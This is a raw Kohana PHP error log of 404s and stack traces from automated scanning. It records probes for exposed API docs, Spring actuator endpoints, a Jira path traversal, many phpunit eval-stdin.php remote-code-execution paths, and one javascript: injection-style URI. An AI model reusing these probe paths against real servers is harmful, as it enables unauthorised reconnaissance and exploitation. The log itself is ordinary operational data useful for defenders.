2025-10-24 18:09:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:19 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:19 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:24 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:24 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:09:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:09:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:09:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:09:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:20:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:20:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:20:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:21:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:21:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:21:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:21:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:21:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:21:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:21:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:21:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:47:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void(location.href=/'mailto:/'+String.fromCharCode(116,101,115,116,101,114,64,99,107,101,100,105,116,111,114,46,99,111,109)+/' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:47:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void(location.href=/'mailto:/'+String.fromCharCode(116,101,115,116,101,114,64,99,107,101,100,105,116,111,114,46,99,111,109)+/' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:49:39 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:49:39 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:50:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/accept.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:50:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/accept.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:50:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/icons/contentDivider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:50:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/icons/contentDivider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:50:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/subArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
